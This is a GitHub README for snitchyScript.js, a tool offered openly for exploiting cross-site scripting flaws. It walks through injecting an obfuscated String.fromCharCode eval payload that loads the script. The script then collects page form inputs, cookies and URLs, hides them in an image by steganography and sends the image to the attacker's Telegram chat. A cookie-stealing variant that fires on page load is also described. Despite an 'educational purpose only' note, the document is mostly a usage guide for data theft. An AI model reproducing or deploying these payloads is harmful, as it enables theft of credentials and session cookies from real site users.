
# snitchyScript.js

Modern XSS exploitation script.

![snitchyScript.js Logo](https://i.ibb.co/NsdcYGC/logo.png)

snitchyScript.js is a JavaScript script that exploit XSS vulnerabilities in a modern and simple way. Once inserted in a page the script will automatically get all elements in the page (such as input values, cookie values, current URL, etc...) and using canvas in JavaScript, create an image and hide all data into it (home made steganography algorithm). Once the image created, the image will be send using Telegram. 

### Proof Of Concept

[![Video PoC Shodan Quest](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://www.youtube.com/watch?v=HBahsMN6PFg)

### Requirement

* Telegram account (API keys)

### How to use

To explain how snitchyScript.js works, I have created two HTML pages in the repo.

* index.html: which simulate a html page with a reflected XSS in order to show how to insert the script and how the script behave.

* decryptLoot.html: which will allow to decrypt the data hidden in the image.
### Installation

Clone the repository

```shell
git clone https://github.com/Naqwa/snitchyScript.git
```

Once the repo cloned, edit the file snitchyScript.js (or snitchyScript.min.js for the minified version) and add your Telegram API credentials in the function sendTelegram.

```javascript
function sendTelegram(blob) {
   const telegramApiToken = '<API_TOKEN>'; //Insert your API_TOKEN
   const telegramChatID = '<chatID>'; //Insert your chatID
...
}
```
Now open the page index.html with your favorite browser. We can see a page with a fake payment. 
![snitchyScript.js home page demo](https://i.ibb.co/PNThqtk/snitchy-Script-home-page-demo.png)

I have created a reflected xss vulnerability on purpose in this page using the GET parameter "xss" to show how to insert and use snitchyScript.js 

For example:
```shell
file:///snitchyScript/index.html?xss=<img src=x onerror=alert('XSS_FOUND_:(');>
```

![snitchyScript.js home page demo xss](https://i.ibb.co/TK6z738/snitchy-Script-home-xss-demo.png)

Now it's time to exploit the xss vulnerability and insert snitchScript.js in the page.

For this, I have created the following payload (of course you are free to make yours!):

```javascript
snitchyCall = document.createElement("script");
snitchyCall.src = 'snitchyScript.js'
document.head.appendChild(snitchyCall);
```
To be able to use it easily in the URL, I encoded the characters in UTF-16. So now our payload looks like this:
```html
<img src=x onerror=eval(String.fromCharCode(115,110,105,116,99,104,121,67,97,108,108,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,10,32,32,32,32,32,32,115,110,105,116,99,104,121,67,97,108,108,46,115,114,99,32,61,32,39,115,110,105,116,99,104,121,83,99,114,105,112,116,46,106,115,39,10,32,32,32,32,32,32,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,110,105,116,99,104,121,67,97,108,108,41,59,32));>
```

Let's inject the payload in the page!

![snitchyScript.js home page demo inject payload](
https://i.ibb.co/t48gB9S/snitchy-Script-home-page-demo-injectpayload.png)

As we can see, the script has been successfully injected in the page.
And after?

Depending on the script you have injected (snitchyScript.js or snitchyScript-reflectedCookie.js) the behavior will not be exactly the same.

snitchyScript.js is based on a click button event, for example when a user clicks on a button, snitchyScript.js will be automatically executed and get all the values in the inputs text, select and textarea (so far) in the page, transform the data into a JSON array, and then insert the JSON array into the image (steganography process) before sending the image via Telegram. snitchyScript.js is more appropriate on a stored XSS case.

In the other hand, snitchyScript-reflectedCookie.js is more appropriate for reflected XSS, but only takes care of stealing the cookie and inserting it into the image before sending it. As soon as the page is loaded the script will be executed and send the cookie (not gonna wait for anything).

![snitchyScript.js demo page filling data](
https://i.ibb.co/DKYXdKx/snitchy-Script-home-page-demo-filled-data.png)

After executed, the script will send the image with the data hide inside in your Telegram chat. For now the image looks like this (can be changed in the code of course):

![snitchyScript.js loot image](
https://i.ibb.co/LdqsFHN/a1ob6.png)

### Decrypt the image
Since the data are hidden in the image, a decryption demo page has been created to extract the data from the image. So now let's go to decryptLoot.html and upload the image received on Telegram.

![snitchyScript.js loot image](
https://i.ibb.co/5cdFj8c/snitchy-Script-decrypt-loot-page.png)

Voila! The data has been decrypted from the image.

### What's next?

More features are coming soon (or not!), stay tune!

### Note
FOR EDUCATIONAL PURPOSE ONLY.